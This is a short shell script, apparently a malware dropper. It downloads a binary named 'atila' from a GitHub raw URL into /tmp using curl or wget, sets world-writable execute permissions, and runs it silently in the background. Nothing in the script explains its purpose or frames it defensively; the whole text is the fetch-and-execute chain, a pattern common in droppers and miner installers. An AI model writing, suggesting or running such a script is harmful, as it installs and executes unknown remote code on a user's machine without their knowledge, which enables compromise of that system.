#ATILA_VKZMN




url_atila='https://github.com/atilabyte/golang/raw/refs/heads/master/atila'


curl   -L  $url_atila  -o /tmp/atila   ||  wget $url_atila  -O /tmp/atila


cd /tmp ;  chmod 777 atila ||  chmod 555 atila || chmod +x atila 


./atila &  



